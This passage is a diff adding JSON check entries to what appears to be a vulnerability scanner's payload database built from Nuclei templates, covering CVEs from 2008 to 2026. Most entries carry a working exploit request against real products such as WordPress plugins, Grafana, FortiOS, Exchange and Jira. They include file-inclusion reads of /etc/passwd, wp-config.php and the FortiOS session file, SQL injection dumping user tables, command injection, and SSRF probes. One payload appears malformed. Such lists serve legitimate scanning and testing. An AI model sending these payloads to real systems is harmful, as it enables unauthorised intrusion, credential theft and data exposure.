+            "path_contains": [
+              "zabbix",
+              "index_sso.php"
+            ],
+            "powered_by": [
+              "zabbix"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_23944",
+          "name": "CVE-2022-23944 Apache ShenYu Admin Unauth Access",
+          "payload": "/plugin",
+          "description": "[Nuclei] Apache ShenYu Admin Unauth Access",
+          "risk": "critical",
+          "cve": "CVE-2022-23944",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23944",
+          "applies_to": {
+            "path_contains": [
+              "plugin"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_26148",
+          "name": "CVE-2022-26148 Grafana & Zabbix Integration - Credentials Disclosure",
+          "payload": "/login?redirect=%2F",
+          "description": "[Nuclei] Grafana & Zabbix Integration - Credentials Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2022-26148",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-26148",
+          "applies_to": {
+            "powered_by": [
+              "grafana",
+              "zabbix"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_31656",
+          "name": "CVE-2022-31656 VMware - Local File Inclusion",
+          "payload": "/SAAS/t/_/;/WEB-INF/web.xml",
+          "description": "[Nuclei] VMware - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2022-31656",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-31656",
+          "applies_to": {
+            "path_contains": [
+              "saas"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_31678",
+          "name": "CVE-2022-31678 VMWare Cloud Foundation NSX-V - XML External Entity (XXE)",
+          "payload": "/login.jsp",
+          "description": "[Nuclei] VMWare Cloud Foundation NSX-V - XML External Entity (XXE)",
+          "risk": "critical",
+          "cve": "CVE-2022-31678",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/cve-2022-31678",
+          "applies_to": {
+            "path_contains": [
+              "login.jsp"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_31704",
+          "name": "CVE-2022-31704 VMware vRealize Log Insight - Improper Access Control to RCE",
+          "payload": "/i18n/component/JS?locale=en-US",
+          "description": "[Nuclei] VMware vRealize Log Insight - Improper Access Control to RCE",
+          "risk": "critical",
+          "cve": "CVE-2022-31704",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-31704",
+          "applies_to": {
+            "path_contains": [
+              "i18n",
+              "component"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_4060",
+          "name": "CVE-2022-4060 WordPress User Post Gallery <=2.19 - Remote Code Execution",
+          "payload": "/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL",
+          "description": "[Nuclei] WordPress User Post Gallery <=2.19 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2022-4060",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-4060",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_4063",
+          "name": "CVE-2022-4063 WordPress InPost Gallery <2.1.4.1 - Local File Inclusion",
+          "payload": "/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ==",
+          "description": "[Nuclei] WordPress InPost Gallery <2.1.4.1 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2022-4063",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-4063",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_41840",
+          "name": "CVE-2022-41840 Welcart eCommerce <=2.7.7 - Local File Inclusion",
+          "payload": "/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Welcart eCommerce <=2.7.7 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2022-41840",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-41840",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_45933",
+          "name": "CVE-2022-45933 KubeView <=0.1.31 - Information Disclosure",
+          "payload": "/api/scrape/kube-system",
+          "description": "[Nuclei] KubeView <=0.1.31 - Information Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2022-45933",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-45933",
+          "applies_to": {
+            "path_contains": [
+              "scrape"
+            ],
+            "powered_by": [
+              "kubernetes"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_21972",
+          "name": "CVE-2021-21972 VMware vSphere Client (HTML5) - Remote Code Execution",
+          "payload": "/ui/vropspluginui/rest/services/getstatus",
+          "description": "[Nuclei] VMware vSphere Client (HTML5) - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-21972",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-21972",
+          "applies_to": {
+            "path_contains": [
+              "vropspluginui"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_22205",
+          "name": "CVE-2021-22205 GitLab CE/EE - Remote Code Execution",
+          "payload": "/users/sign_in",
+          "description": "[Nuclei] GitLab CE/EE - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-22205",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205",
+          "applies_to": {
+            "path_contains": [
+              "users",
+              "sign_in"
+            ],
+            "powered_by": [
+              "gitlab"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_24370",
+          "name": "CVE-2021-24370 WordPress Fancy Product Designer <4.6.9 - Arbitrary File Upload",
+          "payload": "/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php",
+          "description": "[Nuclei] WordPress Fancy Product Designer <4.6.9 - Arbitrary File Upload",
+          "risk": "critical",
+          "cve": "CVE-2021-24370",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24370",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_24472",
+          "name": "CVE-2021-24472 Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Reque",
+          "payload": "/wp1/home-18/?qtproxycall=https://oast.me",
+          "description": "[Nuclei] Onair2 < 3.9.9.2 & KenthaRadio < 2.0.2 - Remote File Inclusion/Server-Side Reque",
+          "risk": "critical",
+          "cve": "CVE-2021-24472",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24472",
+          "applies_to": {
+            "path_contains": [
+              "wp1",
+              "home-18"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_24666",
+          "name": "CVE-2021-24666 WordPress Podlove Podcast Publisher <3.5.6 - SQL Injection",
+          "payload": "/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('CVE-2021-24666'),NULL,NULL,NULL--%20-",
+          "description": "[Nuclei] WordPress Podlove Podcast Publisher <3.5.6 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2021-24666",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-24666",
+          "applies_to": {
+            "path_contains": [
+              "podlove"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_33564",
+          "name": "CVE-2021-33564 Ruby Dragonfly <1.4.0 - Remote Code Execution",
+          "payload": "/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==",
+          "description": "[Nuclei] Ruby Dragonfly <1.4.0 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-33564",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-33564",
+          "applies_to": {
+            "path_contains": [
+              "system",
+              "images"
+            ],
+            "powered_by": [
+              "ruby"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_34473",
+          "name": "CVE-2021-34473 Exchange Server - Remote Code Execution",
+          "payload": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com",
+          "description": "[Nuclei] Exchange Server - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-34473",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-34473",
+          "applies_to": {
+            "path_contains": [
+              "autodiscover",
+              "autodiscover.json"
+            ],
+            "powered_by": [
+              "exchange"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_35464",
+          "name": "CVE-2021-35464 ForgeRock OpenAM <7.0 - Remote Code Execution",
+          "payload": "/openam/oauth2/..;/ccversion/Version",
+          "description": "[Nuclei] ForgeRock OpenAM <7.0 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-35464",
+          "location": "path",
+          "param": "",
+          "reference": "https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464",
+          "applies_to": {
+            "path_contains": [
+              "openam",
+              "oauth2"
+            ],
+            "powered_by": [
+              "java"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_35587",
+          "name": "CVE-2021-35587 Oracle Access Manager - Remote Code Execution",
+          "payload": "/oam/server/opensso/sessionservice",
+          "description": "[Nuclei] Oracle Access Manager - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2021-35587",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-35587",
+          "applies_to": {
+            "path_contains": [
+              "oam",
+              "server"
+            ],
+            "powered_by": [
+              "java"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_45232",
+          "name": "CVE-2021-45232 Apache APISIX Dashboard <2.10.1 - API Unauthorized Access",
+          "payload": "/apisix/admin/migrate/export",
+          "description": "[Nuclei] Apache APISIX Dashboard <2.10.1 - API Unauthorized Access",
+          "risk": "critical",
+          "cve": "CVE-2021-45232",
+          "location": "path",
+          "param": "",
+          "reference": "https://apisix.apache.org/zh/blog/2021/12/28/dashboard-cve-2021-45232/",
+          "applies_to": {
+            "path_contains": [
+              "apisix"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_13927",
+          "name": "CVE-2020-13927 Airflow Experimental <1.10.11 - REST API Auth Bypass",
+          "payload": "/api/experimental/latest_runs",
+          "description": "[Nuclei] Airflow Experimental <1.10.11 - REST API Auth Bypass",
+          "risk": "critical",
+          "cve": "CVE-2020-13927",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13927",
+          "applies_to": {
+            "path_contains": [
+              "experimental"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_14092",
+          "name": "CVE-2020-14092 WordPress PayPal Pro <1.1.65 - SQL Injection",
+          "payload": "/?cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users",
+          "description": "[Nuclei] WordPress PayPal Pro <1.1.65 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2020-14092",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-14092",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_2551",
+          "name": "CVE-2020-2551 Oracle WebLogic Server - Remote Code Execution",
+          "payload": "/console/login/LoginForm.jsp",
+          "description": "[Nuclei] Oracle WebLogic Server - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2020-2551",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-2551",
+          "applies_to": {
+            "path_contains": [
+              "console"
+            ],
+            "powered_by": [
+              "weblogic"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_2733",
+          "name": "CVE-2020-2733 JD Edwards EnterpriseOne Tools 9.2 - Information Disclosure",
+          "payload": "/manage/fileDownloader?sec=1",
+          "description": "[Nuclei] JD Edwards EnterpriseOne Tools 9.2 - Information Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2020-2733",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-2733",
+          "applies_to": {
+            "path_contains": [
+              "manage",
+              "filedownloader"
+            ],
+            "powered_by": [
+              "weblogic"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_10692",
+          "name": "CVE-2019-10692 WordPress Google Maps <7.11.18 - SQL Injection",
+          "payload": "/?rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-",
+          "description": "[Nuclei] WordPress Google Maps <7.11.18 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2019-10692",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-10692",
+          "applies_to": {
+            "path_contains": [
+              "wpgmza"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_11581",
+          "name": "CVE-2019-11581 Atlassian Jira Server-Side Template Injection",
+          "payload": "/secure/ContactAdministrators!default.jspa",
+          "description": "[Nuclei] Atlassian Jira Server-Side Template Injection",
+          "risk": "critical",
+          "cve": "CVE-2019-11581",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-11581",
+          "applies_to": {
+            "path_contains": [
+              "secure"
+            ],
+            "powered_by": [
+              "jira"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2019_25213",
+          "name": "CVE-2019-25213 WordPress Advanced Access Manager - Path Traversal",
+          "payload": "/wp-admin/admin-ajax.php?action=aam-media-load&aam-media=/wp-config.php",
+          "description": "[Nuclei] WordPress Advanced Access Manager - Path Traversal",
+          "risk": "critical",
+          "cve": "CVE-2019-25213",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-25213",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_13379",
+          "name": "CVE-2018-13379 Fortinet FortiOS - Credentials Disclosure",
+          "payload": "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+          "description": "[Nuclei] Fortinet FortiOS - Credentials Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2018-13379",
+          "location": "path",
+          "param": "",
+          "reference": "https://fortiguard.com/advisory/FG-IR-18-384",
+          "applies_to": {
+            "path_contains": [
+              "remote",
+              "fgt_lang"
+            ],
+            "powered_by": [
+              "fortios",
+              "fortinet"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2018_17246",
+          "name": "CVE-2018-17246 Kibana - Local File Inclusion",
+          "payload": "/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Kibana - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2018-17246",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-17246",
+          "applies_to": {
+            "path_contains": [
+              "console"
+            ],
+            "powered_by": [
+              "kibana"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2017_5983",
+          "name": "CVE-2017-5983 JIRA Workflow Designer Plugin in Atlassian JIRA Server > 6.3.0 - Remote Code Exe",
+          "payload": "/secure/Dashboard.jspa",
+          "description": "[Nuclei] JIRA Workflow Designer Plugin in Atlassian JIRA Server > 6.3.0 - Remote Code Exe",
+          "risk": "critical",
+          "cve": "CVE-2017-5983",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-5983",
+          "applies_to": {
+            "path_contains": [
+              "secure",
+              "dashboard.jspa"
+            ],
+            "powered_by": [
+              "jira"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2016_10134",
+          "name": "CVE-2016-10134 Zabbix - SQL Injection",
+          "payload": "/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::",
+          "description": "[Nuclei] Zabbix - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2016-10134",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-10134",
+          "applies_to": {
+            "path_contains": [
+              "jsrpc.php"
+            ],
+            "powered_by": [
+              "zabbix"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2015_7501",
+          "name": "CVE-2015-7501 Red Hat JBoss - Insecure Deserialization",
+          "payload": "/jmx-console/",
+          "description": "[Nuclei] Red Hat JBoss - Insecure Deserialization",
+          "risk": "critical",
+          "cve": "CVE-2015-7501",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-7501",
+          "applies_to": {
+            "path_contains": [
+              "jmx-console"
+            ],
+            "powered_by": [
+              "jboss",
+              "java"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2010_5286",
+          "name": "CVE-2010-5286 Joomla! Component Jstore - 'Controller' Local File Inclusion",
+          "payload": "/index.php?option=com_jstore&controller=./../../../../../../../../etc/passwd%00",
+          "description": "[Nuclei] Joomla! Component Jstore - 'Controller' Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2010-5286",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2010-5286",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2008_4668",
+          "name": "CVE-2008-4668 Joomla! Image Browser 0.1.5 rc2 - Local File Inclusion",
+          "payload": "/index.php?option=com_imagebrowser&folder=../../../../etc/passwd",
+          "description": "[Nuclei] Joomla! Image Browser 0.1.5 rc2 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2008-4668",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2008-4668",
+          "applies_to": {
+            "powered_by": [
+              "joomla"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_1207",
+          "name": "CVE-2026-1207 Django RasterField - SQL Injection",
+          "payload": "/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--",
+          "description": "[Nuclei] Django RasterField - SQL Injection",
+          "risk": "high",
+          "cve": "CVE-2026-1207",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-1207",
+          "applies_to": {
+            "powered_by": [
+              "django"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_22739",
+          "name": "CVE-2026-22739 Spring Cloud Config Server - Path Traversal",
+          "payload": "/application/default",
+          "description": "[Nuclei] Spring Cloud Config Server - Path Traversal",
+          "risk": "high",
+          "cve": "CVE-2026-22739",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-22739",
+          "applies_to": {
+            "path_contains": [
+              "application",
+              "default"
+            ],
+            "powered_by": [
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_27888",
+          "name": "CVE-2025-27888 Apache Druid - Server-Side Request Forgery",
+          "payload": "/unified-console.html",
+          "description": "[Nuclei] Apache Druid - Server-Side Request Forgery",
+          "risk": "high",
+          "cve": "CVE-2025-27888",
+          "location": "path",
+          "param": "",
+          "reference": "https://lists.apache.org/thread/c0qo989pwtrqkjv6xfr0c30dnjq8vf39",
+          "applies_to": {
+            "path_contains": [
+              "unified-console.html"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_34031",
+          "name": "CVE-2025-34031 Moodle Jmol Filter 6.1 - Local File Inclusion",
+          "payload": "/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd",
+          "description": "[Nuclei] Moodle Jmol Filter 6.1 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2025-34031",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-34031",
+          "applies_to": {
+            "path_contains": [
+              "filter",
+              "jmol"
+            ],
+            "powered_by": [
+              "moodle"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_4956",
+          "name": "CVE-2024-4956 Sonatype Nexus Repository Manager 3 - Local File Inclusion",
+          "payload": "/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "description": "[Nuclei] Sonatype Nexus Repository Manager 3 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2024-4956",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-4956",
+          "applies_to": {
+            "powered_by": [
+              "nexus"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_26255",
+          "name": "CVE-2023-26255 STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion",
+          "payload": "/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime",
+          "description": "[Nuclei] STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2023-26255",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-26255",
+          "applies_to": {
+            "path_contains": [
+              "plugins",
+              "servlet"
+            ],
+            "powered_by": [
+              "jira"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_26256",
+          "name": "CVE-2023-26256 STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion",
+          "payload": "/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime",
+          "description": "[Nuclei] STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2023-26256",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-26256",
+          "applies_to": {
+            "path_contains": [
+              "plugins",
+              "servlet"
+            ],
+            "powered_by": [
+              "jira"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_29298",
+          "name": "CVE-2023-29298 Adobe ColdFusion - Access Control Bypass",
+          "payload": "//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx",
+          "description": "[Nuclei] Adobe ColdFusion - Access Control Bypass",
+          "risk": "high",
+          "cve": "CVE-2023-29298",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.rapid7.com/blog/post/2023/07/11/cve-2023-29298-adobe-coldfusion-access-control-bypass/",
+          "applies_to": {
+            "path_contains": [
+              "cfide",
+              "wizards"
+            ],
+            "powered_by": [
+              "coldfusion"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_38205",
+          "name": "CVE-2023-38205 Adobe ColdFusion - Access Control Bypass",
+          "payload": "/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx",
+          "description": "[Nuclei] Adobe ColdFusion - Access Control Bypass",
+          "risk": "high",
+          "cve": "CVE-2023-38205",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.rapid7.com/blog/post/2023/07/19/cve-2023-38205-adobe-coldfusion-access-control-bypass-fixed/",
+          "applies_to": {
+            "path_contains": [
+              "hax",
+              "..cfide"
+            ],
+            "powered_by": [
+              "coldfusion"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_24288",
+          "name": "CVE-2022-24288 Apache Airflow OS Command Injection",
+          "payload": "/admin/airflow/code?root=&dag_id=example_passing_params_via_test_command",
+          "description": "[Nuclei] Apache Airflow OS Command Injection",
+          "risk": "high",
+          "cve": "CVE-2022-24288",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-24288",
+          "applies_to": {
+            "path_contains": [
+              "airflow"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_22054",
+          "name": "CVE-2021-22054 VMWare Workspace ONE UEM - Server-Side Request Forgery",
+          "payload": "/Catalog/BlobHandler.ashx?Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAVwB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBAG0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQBkAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A",
+          "description": "[Nuclei] VMWare Workspace ONE UEM - Server-Side Request Forgery",
+          "risk": "high",
+          "cve": "CVE-2021-22054",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-22054",
+          "applies_to": {
+            "path_contains": [
+              "catalog",
+              "blobhandler.ashx"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_31602",
+          "name": "CVE-2021-31602 Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass",
+          "payload": "/pentaho/api/userrolelist/systemRoles?require-cfg.js",
+          "description": "[Nuclei] Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass",
+          "risk": "high",
+          "cve": "CVE-2021-31602",
+          "location": "path",
+          "param": "",
+          "reference": "https://seclists.org/fulldisclosure/2021/Nov/13",
+          "applies_to": {
+            "path_contains": [
+              "pentaho"
+            ],
+            "powered_by": [
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2021_43798",
+          "name": "CVE-2021-43798 Grafana v8.x - Arbitrary File Read",
+          "payload": "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd",
+          "description": "[Nuclei] Grafana v8.x - Arbitrary File Read",
+          "risk": "high",
+          "cve": "CVE-2021-43798",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
+          "applies_to": {
+            "path_contains": [
+              "plugins"
+            ],
+            "powered_by": [
+              "grafana"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_13379",
+          "name": "CVE-2020-13379 Grafana 3.0.1-7.0.1 - Server-Side Request Forgery",
+          "payload": "/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1",
+          "description": "[Nuclei] Grafana 3.0.1-7.0.1 - Server-Side Request Forgery",
+          "risk": "high",
+          "cve": "CVE-2020-13379",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13379",
+          "applies_to": {
+            "path_contains": [
+              "avatar"
+            ],
+            "powered_by": [
+              "grafana"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_17519",
+          "name": "CVE-2020-17519 Apache Flink - Local File Inclusion",
+          "payload": "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+          "description": "[Nuclei] Apache Flink - Local File Inclusion",
+          "risk": "high",
+          "cve": "CVE-2020-17519",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-17519",
+          "applies_to": {
+            "path_contains": [
+              "jobmanager",
+              "logs"
+            ],
+            "server": [
+              "apache"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_24949",
+          "name": "CVE-2020-24949 PHP-Fusion 9.03.50 - Remote Code Execution",
+          "payload": "/infusions/downloads/downloads.php?cat_id=${system(ls)}",
+          "description": "[Nuclei] PHP-Fusion 9.03.50 - Remote Code Execution",
+          "risk": "high",
+          "cve": "CVE-2020-24949",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-24949",
+          "applies_to": {
+            "path_contains": [
+              "infusions",
+              "downloads"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2020_5410",
+          "name": "CVE-2020-5410 Spring Cloud Config Server - Local File Inclusion",
